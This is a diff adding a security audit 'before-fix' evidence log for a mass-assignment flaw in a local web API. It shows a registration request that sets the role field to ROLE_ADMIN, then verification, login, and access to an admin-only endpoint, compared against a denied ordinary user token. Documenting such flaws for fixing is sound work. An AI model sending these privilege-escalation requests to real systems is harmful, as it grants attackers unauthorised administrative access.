@@ -1,0 +1,104 @@
+================================================================================
+BEFORE-FIX EVIDENCE LOG: V03 (Client-Controlled Role Assignment / Mass Assignment)
+Timestamp: 2026-09-24T16:48:00+05:30
+Target URL: http://localhost:8080/api/v1/auth/register
+================================================================================
+
+--- 1. REGISTRATION REQUEST WITH PRIVILEGED ROLE ---
+POST /api/v1/auth/register HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/8.9.1
+Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575
+
+-----------------------------974767299852498929531610575
+Content-Disposition: form-data; name="firstName"
+
+Escalated
+-----------------------------974767299852498929531610575
+Content-Disposition: form-data; name="lastName"
+
+Admin
+-----------------------------974767299852498929531610575
+Content-Disposition: form-data; name="email"
+
+audit_escalated_admin@test.com
+-----------------------------974767299852498929531610575
+Content-Disposition: form-data; name="password"
+
+[REDACTED_PASSWORD]
+-----------------------------974767299852498929531610575
+Content-Disposition: form-data; name="role"
+
+ROLE_ADMIN
+-----------------------------974767299852498929531610575--
+
+--- REGISTRATION RESPONSE ---
+HTTP/1.1 201 Created
+Content-Type: application/json
+Date: Thu, 24 Sep 2026 11:17:43 GMT
+
+{
+  "message": "User registered. Please check your email for verification.",
+  "profileImageUrl": null,
+  "verificationToken": "[REDACTED_TOKEN]"
+}
+
+--- 2. ACCOUNT VERIFICATION ---
+GET /api/v1/auth/verify-email?token=[REDACTED_TOKEN] HTTP/1.1
+Host: localhost:8080
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"message": "Email verified successfully!"}
+
+--- 3. LOGIN AND TOKEN INSPECTION ---
+POST /api/v1/auth/login HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
+{"email": "audit_escalated_admin@test.com", "password": "[REDACTED_PASSWORD]"}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "message": "Login successful",
+  "accessToken": "[REDACTED_ACCESS_TOKEN]",
+  "refreshToken": "[REDACTED_REFRESH_TOKEN]",
+  "email": "audit_escalated_admin@test.com",
+  "firstName": "Escalated",
+  "lastName": "Admin",
+  "profileImageUrl": null,
+  "role": "ROLE_ADMIN"
+}
+
+--- 4. ACCESSING ADMIN-RESTRICTED ENDPOINT WITH ESCALATED TOKEN ---
+GET /api/v1/seller/seller-requests HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer [REDACTED_ACCESS_TOKEN]
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+[]
+
+--- 5. COMPARISON: ACCESSING SAME ENDPOINT WITH STANDARD ROLE_USER TOKEN ---
+GET /api/v1/seller/seller-requests HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer [REDACTED_USER_TOKEN]
+
+HTTP/1.1 500 Internal Server Error
+Content-Type: application/json
+
+{
+  "status": 500,
+  "timestamp": "2026-09-24T11:18:37.984179700Z",
+  "message": "Something went wrong: Access Denied",
+  "error": "Internal Server Error"
+}
+
+================================================================================
+RESULT: CONFIRMED VULNERABILITY (V03)
+Status: HTTP 201 Created with role=ROLE_ADMIN, token grants full administrative privileges.
+================================================================================
